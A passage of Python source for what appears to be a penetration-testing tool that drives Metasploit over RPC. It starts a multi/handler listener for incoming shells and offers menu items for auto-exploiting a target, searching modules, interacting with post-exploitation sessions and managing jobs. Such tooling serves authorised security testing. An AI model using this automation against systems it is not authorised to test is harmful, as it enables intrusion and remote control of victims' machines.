            con.write(f"setg LHOST {lhost}\n")
            con.write(f"setg LPORT {lport}\n")
            con.write("exploit -j -z\n")
            time.sleep(2)
            out = con.read()
            if out and out.get('data'):
                console.print(f"[dim]{out['data'].strip()}[/dim]")
            console.print(
                f"[bold green][+] Listener running on {lhost}:{lport}  "
                f"payload={payload}[/bold green]")
        except Exception as e:
            console.print(f"[red][!] Listener failed: {e}[/red]")

    # ─────────────────────────────────────────
    #  Main menu
    # ─────────────────────────────────────────

    def run(self):
        draw_header("Metasploit RPC Orchestrator")

        if not self._check_deps():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        if not self.connect_rpc():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        MENU = [
            "1. Auto-Exploit Target",
            "2. Search MSF Modules",
            "3. Start Catch-All Listener (multi/handler)",
            "4. Active Sessions & Post-Exploitation",
            "5. Manage Background Jobs",
            "Back",
        ]

        try:
            while True:
                choice = questionary.select(
                    "MSF-RPC Operations:", choices=MENU, style=Q_STYLE).ask()

                if not choice or choice == "Back":
                    break
                elif "Auto-Exploit" in choice:
                    self.auto_exploit()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                elif "Search" in choice:
                    self.search_modules()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                elif "Listener" in choice:
                    self.start_listener()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                elif "Sessions" in choice:
                    self.interact_session()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                elif "Jobs" in choice:
                    self.manage_jobs()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
        finally:
            self.cleanup()


# ═══════════════════════════════════════════════════════════════════════════════
#  Entry point
# ═══════════════════════════════════════════════════════════════════════════════

def run_msf():
    engine = MetasploitRPCEngine()
    engine.run()


if __name__ == "__main__":
    run_msf()
